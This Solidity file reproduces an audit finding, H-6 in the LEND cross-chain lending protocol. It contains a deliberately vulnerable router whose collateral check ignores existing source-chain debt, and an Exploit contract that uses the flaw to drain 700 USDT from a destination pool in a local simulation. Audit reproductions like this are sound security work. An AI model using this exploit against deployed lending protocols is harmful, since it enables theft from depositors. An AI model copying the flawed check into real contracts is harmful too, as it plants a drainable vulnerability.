// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

// ─────────────────────────────────────────────────────────────────────────────
// Self-contained reproduction of AuditVault finding 58375 (H-6):
// "Cross-chain borrow ignores existing debt in collateral validation" (LEND).
//
// Real audited source (the vulnerable lines are reproduced VERBATIM, @> marked):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fns    borrowCrossChain             (source chain, L133-L153; @> at L139)
//          _handleBorrowCrossChainRequest (destination chain, L581-L625; require @ L622)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/341
//
// Root cause: on the SOURCE chain `borrowCrossChain()` calls
//   getHypotheticalAccountLiquidityCollateral(...) -> (totalBorrowed, collateral)
// but keeps ONLY `collateral` (the @> line drops `totalBorrowed`) and ships the
// RAW collateral value to the destination chain. The DESTINATION chain then does
//   require(payload.collateral >= totalBorrowed, "Insufficient collateral");
// where `totalBorrowed` is only the destination-chain debt (+ the new borrow).
// Because the source chain's EXISTING debt was never subtracted, a user who has
// already borrowed near their limit on chain A can borrow AGAIN on chain B
// against the same collateral -> systemic undercollateralization / drain.
//
// getHypotheticalAccountLiquidityCollateral is reproduced as a faithful double
// (collateral loop, borrow loop, effect-of-new-borrow) returning
// (sumBorrowPlusEffects, sumCollateral) exactly like the audited LendStorage.
// LayerZero transport, CoreRouter payout, ERC20 are faithful minimal doubles
// (real transfers, real accounting) — the bug emerges from the verbatim lines.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

/// @dev Faithful minimal ERC20 double.
contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful marker double for an lToken (accrueInterest / borrowIndex are
///      no-op faithful doubles; `payable`-castable to match `LToken(payable(x))`).
contract LToken {
    function accrueInterest() external {}
    function borrowIndex() external pure returns (uint256) {
        return 1e18;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// LendStorage double: reproduces getHypotheticalAccountLiquidityCollateral with
// the same shape as the audited contract — collateral loop over supplied assets,
// borrow loop over borrowed assets, then effect-of-new-borrow — returning
// (sumBorrowPlusEffects, sumCollateral) = (totalBorrowed, totalCollateral).
// Prices are $1 (1e18) stablecoins and collateral factor 0.8e18, matching the
// finding's worked example.
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    mapping(address => address) public underlyingTolToken; // underlying -> lToken
    mapping(address => address) public lTokenToUnderlying; // lToken -> underlying
    mapping(address => mapping(uint32 => address)) public destTokens; // underlying -> eid -> destlToken

    mapping(address => uint256) public collateralFactor; // lToken -> factor (1e18)
    mapping(address => uint256) public priceOf; // lToken -> price (1e18)

    mapping(address => address[]) internal suppliedAssets; // account -> lTokens
    mapping(address => mapping(address => bool)) internal isSupplied;
    mapping(address => mapping(address => uint256)) public totalInvestment; // account -> lToken -> raw supplied

    mapping(address => address[]) internal borrowedAssets; // account -> lTokens
    mapping(address => mapping(address => bool)) internal isBorrowed;
    mapping(address => mapping(address => uint256)) public borrowBalance; // account -> lToken -> underlying borrowed

    // ── configuration doubles (not part of the vulnerable logic) ──
    function configureMarket(address lToken_, address underlying_, uint256 cf_, uint256 price_) external {
        underlyingTolToken[underlying_] = lToken_;
        lTokenToUnderlying[lToken_] = underlying_;
        collateralFactor[lToken_] = cf_;
        priceOf[lToken_] = price_;
    }

    function mapDestToken(address underlying_, uint32 eid_, address destlToken_) external {
        destTokens[underlying_][eid_] = destlToken_;
    }

    function underlyingToDestlToken(address underlying_, uint32 eid_) external view returns (address) {
        return destTokens[underlying_][eid_];
    }

    function addUserSuppliedAsset(address account, address lToken_) public {
        if (!isSupplied[account][lToken_]) {
            isSupplied[account][lToken_] = true;
            suppliedAssets[account].push(lToken_);
        }
    }

    function getUserSuppliedAssets(address account) external view returns (address[] memory) {
        return suppliedAssets[account];
    }

    function addInvestment(address account, address lToken_, uint256 amount) external {
        totalInvestment[account][lToken_] += amount;
    }

    function addBorrowBalance(address account, address lToken_, uint256 amount) external {
        if (!isBorrowed[account][lToken_]) {
            isBorrowed[account][lToken_] = true;
            borrowedAssets[account].push(lToken_);
        }
        borrowBalance[account][lToken_] += amount;
    }

    /// @notice Faithful double of LendStorage.getHypotheticalAccountLiquidityCollateral.
    /// @return (sumBorrowPlusEffects, sumCollateral) == (totalBorrowed, totalCollateral).
    function getHypotheticalAccountLiquidityCollateral(
        address account,
        LToken lTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) public view returns (uint256, uint256) {
        uint256 sumCollateral;
        uint256 sumBorrowPlusEffects;

        // First loop: collateral value from supplied assets
        address[] memory supplied = suppliedAssets[account];
        for (uint256 i = 0; i < supplied.length; ++i) {
            address asset = supplied[i];
            uint256 bal = totalInvestment[account][asset];
            uint256 tokensToDenom = (collateralFactor[asset] * priceOf[asset]) / 1e18; // exchangeRate == 1
            sumCollateral += (bal * tokensToDenom) / 1e18;
        }

        // Second loop: borrow value from borrowed assets
        address[] memory borrowed = borrowedAssets[account];
        for (uint256 i = 0; i < borrowed.length; ++i) {
            address asset = borrowed[i];
            sumBorrowPlusEffects += (borrowBalance[account][asset] * priceOf[asset]) / 1e18;
        }

        // Effects of current action
        if (address(lTokenModify) != address(0)) {
            uint256 price = priceOf[address(lTokenModify)];
            if (redeemTokens > 0) {
                uint256 tokensToDenom = (collateralFactor[address(lTokenModify)] * price) / 1e18;
                sumBorrowPlusEffects += (tokensToDenom * redeemTokens) / 1e18;
            }
            if (borrowAmount > 0) {
                sumBorrowPlusEffects += (price * borrowAmount) / 1e18;
            }
        }

        return (sumBorrowPlusEffects, sumCollateral);
    }
}

/// @dev Faithful CoreRouter double (destination): pays the borrow out of the
///      destination liquidity to the borrower, gated to the CrossChainRouter.
contract CoreRouter {
    IERC20 public immutable underlying; // destination borrow liquidity (e.g. USDT)
    address public crossChainRouter;

    constructor(IERC20 underlying_) {
        underlying = underlying_;
    }

    function setCrossChainRouter(address r) external {
        crossChainRouter = r;
    }

    function borrowForCrossChain(address _borrower, uint256 _amount, address, /*_destlToken*/ address _destUnderlying)
        external
    {
        require(crossChainRouter != address(0), "CrossChainRouter not set");
        require(msg.sender == crossChainRouter, "Access Denied");
        IERC20(_destUnderlying).transfer(_borrower, _amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — one code base deployed on each chain. borrowCrossChain
// (source) and _handleBorrowCrossChainRequest (destination) reproduce the
// audited lines VERBATIM; the LayerZero hop is a faithful direct call.
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter {
    LendStorage public immutable lendStorage;
    address payable public coreRouter;
    uint32 public immutable currentEid;
    address public peer; // faithful double of the LayerZero peer (other chain's router)

    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    enum ContractType {
        BorrowCrossChain,
        ValidBorrowRequest,
        DestRepay,
        CrossChainLiquidationExecute,
        LiquidationSuccess,
        LiquidationFailure
    }

    constructor(LendStorage lendStorage_, uint32 currentEid_, address payable coreRouter_) {
        lendStorage = lendStorage_;
        currentEid = currentEid_;
        coreRouter = coreRouter_;
    }

    function setPeer(address p) external {
        peer = p;
    }

    receive() external payable {}

    // ── faithful same-chain supply / borrow doubles (establish the honest
    //    source-chain position the destination check is supposed to respect) ──

    function supply(address underlying_, uint256 amount) external {
        address lToken = lendStorage.underlyingTolToken(underlying_);
        IERC20(underlying_).transferFrom(msg.sender, address(this), amount);
        lendStorage.addUserSuppliedAsset(msg.sender, lToken);
        lendStorage.addInvestment(msg.sender, lToken, amount);
    }

    function borrow(address underlying_, uint256 amount) external {
        address lToken = lendStorage.underlyingTolToken(underlying_);
        // CORRECT same-chain check: collateral must cover existing + new borrow.
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(lToken), 0, amount);
        require(collateral >= borrowed, "Insufficient collateral");
        lendStorage.addBorrowBalance(msg.sender, lToken, amount);
        IERC20(underlying_).transfer(msg.sender, amount);
    }

    function isMarketEntered(address user, address asset) internal view returns (bool) {
        address[] memory suppliedAssets = lendStorage.getUserSuppliedAssets(user);
        for (uint256 i = 0; i < suppliedAssets.length;) {
            if (suppliedAssets[i] == asset) return true;
            unchecked {
                ++i;
            }
        }
        return false;
    }

    function enterMarkets(address) internal {}

    // ── SOURCE CHAIN: borrowCrossChain — reproduced from CrossChainRouter.sol ──
    function borrowCrossChain(uint256 _amount, address _borrowToken, uint32 _destEid) external payable {
        require(msg.sender != address(0), "Invalid sender");
        require(_amount != 0, "Zero borrow amount");
        require(address(this).balance > 0, "Out of money");

        // Get source lToken for collateral
        address _lToken = lendStorage.underlyingTolToken(_borrowToken);
        require(_lToken != address(0), "Unsupported source token");

        // Get the destination chain's version of the token
        address destLToken = lendStorage.underlyingToDestlToken(_borrowToken, _destEid);
        require(destLToken != address(0), "Unsupported destination token");

        // Accrue interest on source token (collateral token) on source chain
        LToken(payable(_lToken)).accrueInterest();

        // Add collateral tracking on source chain
        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
        }

        // Get current collateral amount for the LayerZero message
        // This will be used on dest chain to check if sufficient
        (, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), 0, 0); // @> VULN: keeps only `collateral`, drops `totalBorrowed`; raw collateral (ignoring existing debt) is shipped to the destination chain

        // Send message to destination chain with verified sender
        // borrowIndex of 0 initially - will be set correctly on dest chain
        _send(
            _destEid,
            _amount,
            0, // Initial borrowIndex, will be set on dest chain
            collateral,
            msg.sender,
            destLToken,
            address(0), // liquidator
            _borrowToken,
            ContractType.BorrowCrossChain
        );
    }

    // ── faithful LayerZero transport double ──
    function _send(
        uint32 _dstEid,
        uint256 _amount,
        uint256 _borrowIndex,
        uint256 _collateral,
        address _sender,
        address _destlToken,
        address _liquidator,
        address _srcToken,
        ContractType _cType
    ) internal {
        LZPayload memory payload = LZPayload(
            _amount, _borrowIndex, _collateral, _sender, _destlToken, _liquidator, _srcToken, uint8(_cType)
        );
        if (_cType == ContractType.BorrowCrossChain) {
            // delivered to the destination chain's router as an inbound LZ message
            CrossChainRouter(payable(peer)).lzReceiveBorrow(payload, currentEid);
        }
        // ValidBorrowRequest confirmation back to source is a no-op double here.
    }

    // faithful inbound LayerZero entrypoint double
    function lzReceiveBorrow(LZPayload memory payload, uint32 srcEid) external {
        require(msg.sender == peer, "Only peer");
        _handleBorrowCrossChainRequest(payload, srcEid);
    }

    // ── DESTINATION CHAIN: _handleBorrowCrossChainRequest (verbatim core) ──
    function _handleBorrowCrossChainRequest(LZPayload memory payload, uint32 /*srcEid*/ ) private {
        // Accrue interest on borrowed token on destination chain
        LToken(payable(payload.destlToken)).accrueInterest();

        // Important: Use the underlying token address
        address destUnderlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Get existing borrow amount
        (uint256 totalBorrowed,) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
        );

        // Verify the collateral from source chain is sufficient for total borrowed amount
        require(payload.collateral >= totalBorrowed, "Insufficient collateral");

        // Execute the borrow on destination chain
        CoreRouter(coreRouter).borrowForCrossChain(payload.sender, payload.amount, payload.destlToken, destUnderlying);

        // Track borrowed asset on destination
        lendStorage.addBorrowBalance(payload.sender, payload.destlToken, payload.amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: supply 1000 USDC on chain A ($800 capacity @ 80% factor),
// borrow 600 USDT on chain A (leaving $200), then cross-chain borrow 700 USDT
// on chain B. The source ships raw collateral 800 (ignoring the 600 debt), the
// destination sees only its own debt (0) + new 700 and approves 700 >= 0 vs
// require(800 >= 700). A correct check would compare against $200 available and
// revert. Attacker walks away with a 700 USDT borrow that should not exist.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public usdc; // collateral (nonce 1)
    MiniToken public usdt; // borrow asset / drained token (nonce 2)
    LToken public lUSDC; // nonce 3
    LToken public lUSDT_src; // nonce 4
    LToken public lUSDT_dst; // nonce 5
    LendStorage public srcStorage; // nonce 6
    LendStorage public dstStorage; // nonce 7
    CoreRouter public dstCore; // nonce 8
    CrossChainRouter public dstRouter; // nonce 9
    CrossChainRouter public srcRouter; // nonce 10 (VULN executes borrowCrossChain)

    address internal constant SINK = 0x000000000000000000000000000000000000dEaD;

    uint32 internal constant SRC_EID = 1;
    uint32 internal constant DST_EID = 2;

    uint256 internal constant SUPPLY_USDC = 1000e18; // collateral supplied on chain A
    uint256 internal constant CF = 0.8e18; // 80% collateral factor
    uint256 internal constant SRC_BORROW = 600e18; // same-chain borrow on chain A
    uint256 internal constant XCHAIN_BORROW = 700e18; // cross-chain borrow on chain B
    uint256 internal constant DST_LIQUIDITY = 2000e18; // honest depositors' liquidity on chain B

    uint256 public availableCapacity; // correct remaining capacity after src borrow
    uint256 public crossChainReceived; // USDT the bug let the attacker borrow on chain B
    uint256 public dstPoolDrained; // USDT drained from chain B liquidity
    uint256 public profit; // attacker's final USDT (the illegitimate cross-chain borrow)

    constructor() {
        usdc = new MiniToken("USD Coin", "USDC"); // nonce 1
        usdt = new MiniToken("Tether USD", "USDT"); // nonce 2
        lUSDC = new LToken(); // nonce 3
        lUSDT_src = new LToken(); // nonce 4
        lUSDT_dst = new LToken(); // nonce 5
        srcStorage = new LendStorage(); // nonce 6
        dstStorage = new LendStorage(); // nonce 7
        dstCore = new CoreRouter(IERC20(address(usdt))); // nonce 8
        dstRouter = new CrossChainRouter(dstStorage, DST_EID, payable(address(dstCore))); // nonce 9
        srcRouter = new CrossChainRouter(srcStorage, SRC_EID, payable(address(0))); // nonce 10 (VULN)

        // ── wire the two chains (config doubles, no `new`) ──
        // Source chain markets: USDC collateral, USDT borrow.
        srcStorage.configureMarket(address(lUSDC), address(usdc), CF, 1e18);
        srcStorage.configureMarket(address(lUSDT_src), address(usdt), CF, 1e18);
        srcStorage.mapDestToken(address(usdt), DST_EID, address(lUSDT_dst));

        // Destination chain market: USDT borrow.
        dstStorage.configureMarket(address(lUSDT_dst), address(usdt), CF, 1e18);

        // LayerZero peering.
        srcRouter.setPeer(address(dstRouter));
        dstRouter.setPeer(address(srcRouter));

        // CoreRouter access control + destination liquidity from honest depositors.
        dstCore.setCrossChainRouter(address(dstRouter));
        usdt.mint(address(dstCore), DST_LIQUIDITY);

        // Source-chain USDT liquidity for the honest same-chain borrow.
        usdt.mint(address(srcRouter), 10_000e18);
    }

    function run() external payable {
        // source router needs a non-zero balance (borrowCrossChain require)
        (bool ok,) = address(srcRouter).call{value: msg.value}("");
        require(ok, "fund src router");

        // fund attacker with collateral only
        usdc.mint(address(this), SUPPLY_USDC);

        // 1) supply 1000 USDC on chain A ($800 borrowing capacity)
        usdc.approve(address(srcRouter), type(uint256).max);
        srcRouter.supply(address(usdc), SUPPLY_USDC);

        // 2) borrow 600 USDT on chain A (honest, passes the correct same-chain check)
        srcRouter.borrow(address(usdt), SRC_BORROW);
        // move the borrowed funds away, isolating the cross-chain drain as profit
        usdt.transfer(SINK, usdt.balanceOf(address(this)));

        // correct remaining capacity = collateral($800) - existing debt($600) = $200
        (uint256 debtA, uint256 collA) =
            srcStorage.getHypotheticalAccountLiquidityCollateral(address(this), LToken(address(0)), 0, 0);
        availableCapacity = collA - debtA; // 200e18

        uint256 dstPoolBefore = usdt.balanceOf(address(dstCore));
        uint256 balBefore = usdt.balanceOf(address(this));

        // 3) cross-chain borrow 700 USDT on chain B against the SAME collateral.
        //    Correct behaviour: reject (available $200 < $700). Vulnerable: approved.
        //    (source router was already funded above, satisfying the balance require)
        srcRouter.borrowCrossChain(XCHAIN_BORROW, address(usdt), DST_EID);

        crossChainReceived = usdt.balanceOf(address(this)) - balBefore;
        dstPoolDrained = dstPoolBefore - usdt.balanceOf(address(dstCore));
        profit = usdt.balanceOf(address(this));

        // ── concrete harm: an under-collateralized cross-chain borrow succeeded ──
        // a correct check would have blocked it (700 > 200 available)
        require(XCHAIN_BORROW > availableCapacity, "not undercollateralized");
        // the attacker actually received the full 700 USDT the check should have denied
        require(crossChainReceived == XCHAIN_BORROW, "cross-chain borrow not paid");
        require(dstPoolDrained == XCHAIN_BORROW, "destination pool not drained");
        require(profit == XCHAIN_BORROW, "unexpected profit");
    }
}
